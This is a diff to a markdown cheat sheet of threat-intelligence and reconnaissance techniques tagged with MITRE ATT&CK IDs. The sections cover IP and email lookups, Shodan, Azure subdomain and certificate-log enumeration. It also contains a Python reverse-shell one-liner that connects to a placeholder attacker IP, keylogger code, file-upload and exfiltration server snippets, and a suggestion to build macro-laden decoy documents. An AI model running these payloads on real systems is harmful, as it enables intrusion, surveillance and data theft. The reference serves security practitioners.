@@ -1,6 +1,29 @@
 # Threat Intelligence TTPs
 
-## Query IP geolocation information with IP2Location.io
+## Table of Contents
+
+- [Query IP geolocation information with IP2Location.io](#query-ip-geolocation-information-with-ip2locationio) - T1016
+- [Enumerating IPs with IPInfo](#enumerating-ips-with-ipinfo) - T1016
+- [Enumerating Domains with RDAP](#enumerating-domains-with-rdap) - T1589
+- [Email Recon](#email-recon) - T1589.002
+- [nrich IP Enumeration](#nrich-ip-enumeration) - T1595.002
+- [Extracting PDF Text with Python Image OCR](#extracting-pdf-text-with-python-image-ocr) - T1213
+- [Threat Intelligence Streams with Python and Reddit](#threat-intelligence-streams-with-python-and-reddit) - T1589
+- [Python HTTPS Server](#python-https-server) - T1105
+- [Enumerating Anonymous FTP Logins Using Python](#enumerating-anonymous-ftp-logins-using-python) - T1046
+- [Python Keylogger](#python-keylogger) - T1056.001
+- [Python Reverse Shell](#python-reverse-shell) - T1059.006
+- [Python Basic File Upload](#python-basic-file-upload) - T1105
+- [Generating HoneyDocs with Python](#generating-honeydocs-with-python) - T1203
+- [Shodan CLI](#shodan-cli) - T1595
+- [Azure Subdomain Enumeration](#azure-subdomain-enumeration) - T1595.003
+- [GitHub Email Addresses](#github-email-addresses) - T1589.002
+- [Code Enumeration with Grep App](#code-enumeration-with-grep-app) - T1213
+- [Certificate Transparency Logs Enumeration with Go](#certificate-transparency-logs-enumeration-with-go) - T1596.002
+
+---
+
+## Query IP geolocation information with IP2Location.io (T1016)
 
 ``` bash
 curl -s "https://api.ip2location.io/?ip=8.8.8.8&format=json" | jq
@@ -24,7 +47,7 @@ curl -s "https://api.ip2location.io/?ip=8.8.8.8&format=json" | jq
 }
 ```
 
-## Enumerating IPs with IPInfo
+## Enumerating IPs with IPInfo (T1016)
 
 ```curl ipinfo.io/54.90.107.240```
 
@@ -44,7 +67,7 @@ curl -s "https://api.ip2location.io/?ip=8.8.8.8&format=json" | jq
 
 You can also utilize <https://cybergordon.com/> to check for IP reputation!
 
-## Enumerating Domains with RDAP
+## Enumerating Domains with RDAP (T1589)
 
 The Registration Data Access Protocol (RDAP) is the definitive source for delivering generic top-level domain name (gTLD) registration information in place of sunsetted WHOIS services. The `rdap` command is a full-featured, command-line interface (CLI) client for RDAP. It supports RDAP bootstrapping, caching, different output formats, and many more features.
 
@@ -72,7 +95,7 @@ rdap as64496
 rdap https://rdap.iana.org/domain/com
 ```
 
-## Email Recon
+## Email Recon (T1589.002)
 
 ```curl emailrep.io/john.smith@gmail.com```
 
@@ -125,7 +148,7 @@ rdap https://rdap.iana.org/domain/com
 curl -X GET "https://api.hunter.io/v2/email-finder?domain=reddit.com&first_name=Alexis&last_name=Ohanian&api_key=XXXXXXXXXXXXXXX"
 ```
 
-## nrich IP Enumeration
+## nrich IP Enumeration (T1595.002)
 
 A command-line tool to quickly analyze all IPs in a file and see which ones have open ports/ vulnerabilities. Can also be fed data from stdin to be used in a data pipeline.
 
@@ -167,7 +190,7 @@ ARGS:
     <filename>    File containing an IP per line. Non-IPs are ignored
 ```
 
-## Extracting PDF Text with Python Image OCR
+## Extracting PDF Text with Python Image OCR (T1213)
 
 ```python
 #!/usr/bin/env python3
@@ -183,7 +206,7 @@ pdf_img = np.array(Image.open(file))
 text = pyTesseract.image_to_string(pdf_img)
 ```
 
-## Threat Intelligence Streams with Python and Reddit
+## Threat Intelligence Streams with Python and Reddit (T1589)
 
 Enumerate new Reddit comments for threat intelligence. This script can be modified with regular expressions to hone in on exploit development, modern threats, and any newsworthy cyber events.
 
@@ -203,7 +226,7 @@ for comment in reddit.subreddit('hacking+infosec+redteamsec+cybersecurity+netsec
     print(comment.body)
 ```
 
-## Python HTTPS Server
+## Python HTTPS Server (T1105)
 
 ```python
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -216,7 +239,7 @@ httpd.serve_forever()
 
 Source: ```https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration```
 
-## Enumerating Anonymous FTP Logins Using Python
+## Enumerating Anonymous FTP Logins Using Python (T1046)
 
 ```python
 #!/usr/bin/python3
@@ -245,7 +268,7 @@ for item in r:
 2. Note : Use shodan_eye.py to search for FTP servers that have the ```anon``` login enabled.
 3. Search Keyword : ```230 anonymous```
 
-## Python Keylogger
+## Python Keylogger (T1056.001)
 
 ```python
 import pyHook, pythoncom, logging
@@ -273,13 +296,13 @@ with keyboard_listener:
     keyboard_listener.join()
 ```
 
-## Python Reverse Shell
+## Python Reverse Shell (T1059.006)
 
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-## Python Basic File Upload
+## Python Basic File Upload (T1105)
 
 ```python
 # Listen to files
@@ -294,7 +317,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
 
-## Generating HoneyDocs with Python
+## Generating HoneyDocs with Python (T1203)
 
 Python's Faker module can be utilized to create honeydocs of PII with malicious macros, wordlists, emails for login brute-forcing, and much more.
 
@@ -323,7 +346,7 @@ faker_df = pd.DataFrame({'date':[fake.date() for i in range(10)],
 faker_df
 ```
 
-## Shodan CLI
+## Shodan CLI (T1595)
 
 The `shodan` command-line interface (CLI) is packaged with the official Python library for Shodan, which means if you're running the latest version of the library you already have access to the CLI. To install the new tool simply execute:
 
@@ -371,7 +394,7 @@ This command lets you search Shodan and view the results in a terminal-friendly 
 shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0
 ```
 
-## Azure Subdomain Enumeration
+## Azure Subdomain Enumeration (T1595.003)
 
 A simple Go program for enumerating Azure targets:
 
@@ -535,7 +558,7 @@ azscan -domain umgc
   CNAME data-prod-ncu.vaultcore.azure.net.
 ```
 
-## GitHub Email Addresses
+## GitHub Email Addresses (T1589.002)
 
 - A script for enumerating GitHub to find a user's email:
 
@@ -608,7 +631,7 @@ while :; do
 done
 ```
 
-## Code Enumeration with Grep App
+## Code Enumeration with Grep App (T1213)
 
 - Rapidly scan millions of code repositories with Grep App:
 
@@ -624,7 +647,7 @@ curl -sG "https://grep.app/search" \
   | sort -u
 ```
 
-## Certificate Transparency Logs Enumeration with Go
+## Certificate Transparency Logs Enumeration with Go (T1596.002)
 
 Certificate Transparency (CT) logs are publicly accessible repositories that record all SSL/TLS certificates issued by Certificate Authorities. These logs make it possible to monitor certificate issuance, detect misissued certificates, and discover subdomains and services associated with a target domain.
 
